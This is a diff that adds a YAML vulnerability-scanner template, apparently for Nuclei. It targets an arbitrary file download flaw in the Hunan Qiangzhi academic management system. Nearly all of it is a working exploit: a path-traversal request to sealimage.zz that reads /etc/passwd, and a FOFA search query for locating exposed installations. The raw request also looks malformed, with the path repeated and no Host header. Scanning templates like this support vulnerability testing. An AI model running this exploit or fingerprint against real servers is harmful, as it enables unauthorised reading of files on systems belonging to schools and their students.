@@ -1,0 +1,21 @@
+id: poc-ffxwsb0z41wq3bpm
+info:
+  name: 湖南强智教务管理系统sealimage存在任意文件下载
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ffxwsb0z41wq3bpm'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ffxwsb0z41wq3bpm
+    fofa: body="湖南强智科技发展有限公司" && body="jq控件公用静态对象"
+http:
+- raw:
+  - 'GET /sealimage.zz?imgtype=*/*&imgpath=../../../../../../../../../etc/passwd HTTP/1.1
+
+    /sealimage.zz?imgtype=*/*&imgpath=../../../../../../../../../etc/passwd'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
